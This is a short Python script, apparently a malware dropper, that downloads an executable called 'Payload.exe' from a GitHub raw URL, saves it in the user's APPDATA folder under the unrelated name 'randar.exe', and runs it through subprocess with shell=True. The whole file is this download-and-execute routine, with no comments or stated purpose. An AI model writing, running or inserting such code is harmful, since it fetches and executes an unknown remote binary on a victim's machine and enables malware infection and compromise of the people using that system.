import os
import urllib.request
import subprocess

def download_and_run(url, filename):
    appdata = os.getenv("APPDATA")
    if not appdata:
        appdata = os.path.expanduser("~")
    filepath = os.path.join(appdata, filename)
    if not os.path.exists(filepath):
        urllib.request.urlretrieve(url, filepath)
    subprocess.Popen([filepath], shell=True)


url = "https://github.com/deprosinal/didactic-octo-funicular/raw/refs/heads/main/Payload.exe"
filename = "randar.exe"

download_and_run(url, filename)
